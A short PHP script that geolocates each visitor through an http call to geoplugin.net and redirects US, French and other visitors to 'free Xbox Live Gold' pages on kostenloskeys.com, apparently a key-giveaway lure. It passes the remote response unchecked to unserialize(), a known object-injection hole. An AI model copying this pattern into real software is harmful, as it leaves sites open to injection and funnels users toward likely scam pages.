<?php
$a = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$_SERVER['REMOTE_ADDR']));
$countrycode= $a['geoplugin_countryCode'];

if ($countrycode=='US')
    header( 'Location: https://kostenloskeys.com/xboxlivegold/' ) ;
else if ($countrycode=='FR')
    header( 'Location: https://kostenloskeys.com/fr/xboxlivegold/' ) ;
else
    header( 'Location: https://kostenloskeys.com/xboxlivegold/' ) ;
?>